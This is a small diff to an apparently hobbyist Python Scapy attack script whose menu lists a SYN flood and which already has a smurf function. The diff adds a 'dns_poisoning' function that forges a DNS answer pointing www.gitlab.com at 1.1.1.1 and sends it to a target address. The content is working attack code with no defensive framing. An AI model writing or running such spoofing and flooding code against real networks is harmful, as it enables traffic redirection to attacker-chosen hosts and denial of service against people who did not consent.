@@ -13,6 +13,10 @@ def smurf():
     sendp(msg, count=25)
 
 
+def dns_poisoning():
+    msg = Ether(dst=mac_address) / IP(dst=ip_address) / UDP() / DNS(qd=DNSQR(qname="www.gitlab.com"), an=DNSRR(rrname="www.gitlab.com", rdata="1.1.1.1"))
+    sendp(msg)
+
 
 def menu():
     print("1. SYN Flood")
